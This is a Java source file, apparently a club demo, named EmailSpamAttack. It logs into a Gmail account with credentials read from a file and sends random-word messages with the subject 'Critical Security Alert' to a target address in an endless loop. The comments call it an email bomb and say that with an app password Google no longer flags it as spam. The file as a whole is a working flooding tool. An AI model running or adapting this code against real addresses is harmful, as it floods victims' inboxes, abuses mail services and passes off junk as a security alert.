package com.secres.maildemo;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Date;
import java.util.Properties;
import java.util.Random;

import jakarta.mail.Message;
import jakarta.mail.MessagingException;
import jakarta.mail.Multipart;
import jakarta.mail.Session;
import jakarta.mail.Transport;
import jakarta.mail.internet.AddressException;
import jakarta.mail.internet.InternetAddress;
import jakarta.mail.internet.MimeBodyPart;
import jakarta.mail.internet.MimeMessage;
import jakarta.mail.internet.MimeMultipart;

/**
 * A demo for Programming Club to demonstrate the reality of a spam attack/email
 * bomb. This program sends approximately 90 spam mails within 2 minutes until
 * Gmail recognizes it and shuts down the connection, terminating the
 * application.
 * <P>
 * This technique requires
 * <a href="https://myaccount.google.com/lesssecureapps">less secure access</a>
 * to be enabled on the 'from' account.
 * <P>
 * As said before, this is a demo. This requires a previous step: less secure
 * access for apps on the 'from' account.
 * 
 * Update:
 * This demo no longer works as fast (90 spam emails within 9 minutes) due to Google's
 * update removing less secure apps on May 30, 2022.
 * <P>
 * I have to use an app password now instead of the real password. However, Google
 * does not detect the emails as spam anymore and does not terminate the application.
 * 
 * @author Pranav Amarnath
 * @version October 08, 2022
 *
 */
public class EmailSpamAttack {

    private String username;
    private String password;
    private final String PATH = "/credentials.txt";
    private final String TARGET = "target@gmail.com";
    private final String SUBJECT = "Critical Security Alert";
    private Session emailSession;
    private Transport emailTransport;

    /**
     * Constructor to start the process.
     */
    public EmailSpamAttack() {
        try {
            initClient();
        } catch (MessagingException e) {
            e.printStackTrace();
        }
    }

    /**
     * Sets up SMTP.
     * 
     * @throws MessagingException
     */
    private void initClient() throws MessagingException {
        readFile();

        // create properties field
        Properties properties = System.getProperties();
        properties.setProperty("mail.user", username);
        properties.setProperty("mail.password", password);
        properties.put("mail.smtp.ssl.enable", "true");
        properties.put("mail.smtp.starttls.enable", "true");
        properties.put("mail.smtp.starttls.required", "true");
        properties.setProperty("mail.smtp.host", "smtp.gmail.com");
        properties.setProperty("mail.smtp.port", "465");
        properties.setProperty("mail.smtp.auth", "true");

        emailSession = Session.getDefaultInstance(properties);

        emailTransport = emailSession.getTransport();
        emailTransport.connect(username, password);

        startLoop(); // start loop for incoming messages
    }

    /**
     * Read the file containing the credentials to send from.
     */
    private void readFile() {
        try {
            BufferedReader br = new BufferedReader(new InputStreamReader(getClass().getResourceAsStream(PATH), "UTF-8"));
            try {
                String line = "";
                int i = 0;
                while((line = br.readLine()) != null) {
                    if(i % 2 == 0) {
                        username = line;
                    }
                    else {
                        password = line;
                        break; // Even if there are other usernames and passwords, we only want the first pair.
                    }
                    i++;
                }
            } finally {
                br.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * Creates a new {@link Thread} to send e-mails.
     */
    private void startLoop() {
        System.out.println("[LOG] Started spam loop.");
        new Thread(() -> {
            while(true) {
                try {
                    System.out.println("[LOG] Sending mail...");
                    // Send a mail with random 12 letters.
                    sendEmail(System.getProperties(), TARGET, SUBJECT, String.join(" ", generateRandomWords(10)));
                } catch (AddressException e) {
                    e.printStackTrace();
                } catch (MessagingException e) {
                    e.printStackTrace();
                }
                System.out.println("[LOG] Sent mail!");
            }
        }).start();
    }

    /**
     * Generates an array of random letters in words. See
     * https://stackoverflow.com/a/4952066/13772184.
     * 
     * @param numberOfWords the number of words to return
     * @return the String array of words
     */
    private String[] generateRandomWords(int numberOfWords) {
        String[] randomStrings = new String[numberOfWords];
        Random random = new Random();
        for(int i = 0; i < numberOfWords; i++) {
            char[] word = new char[random.nextInt(8) + 3]; // words of length 3 through 10. (1 and 2 letter words are boring.)
            for(int j = 0; j < word.length; j++) {
                word[j] = (char) ('a' + random.nextInt(26));
            }
            randomStrings[i] = new String(word);
        }
        return randomStrings;
    }

    /**
     * Sends the mail.
     * 
     * @param smtpProperties the system properties
     * @param toAddress      the email address to send to
     * @param subject        the subject of the email
     * @param message        the actual content of the email
     * @param attachFiles    the files to attach
     * @throws AddressException
     * @throws MessagingException
     */
    private void sendEmail(Properties smtpProperties, String toAddress, String subject, String message) throws AddressException, MessagingException {
        // creates a new e-mail message
        Message msg = new MimeMessage(emailSession);

        msg.setFrom(new InternetAddress(username));
        InternetAddress[] toAddresses = { new InternetAddress(toAddress) };
        msg.setRecipients(Message.RecipientType.TO, toAddresses);
        msg.setSubject(subject);
        msg.setSentDate(new Date());

        // creates message part
        MimeBodyPart messageBodyPart = new MimeBodyPart();
        messageBodyPart.setContent(message, "text/html");

        // creates multi-part
        Multipart multipart = new MimeMultipart();
        multipart.addBodyPart(messageBodyPart);

        // sets the multi-part as e-mail's content
        msg.setContent(multipart);

        // sends the e-mail
        msg.saveChanges();
        emailTransport.sendMessage(msg, toAddresses);
    }

    /**
     * Main method.
     * 
     * @param args not used
     */
    public static void main(String[] args) {
        new EmailSpamAttack();
    }

}
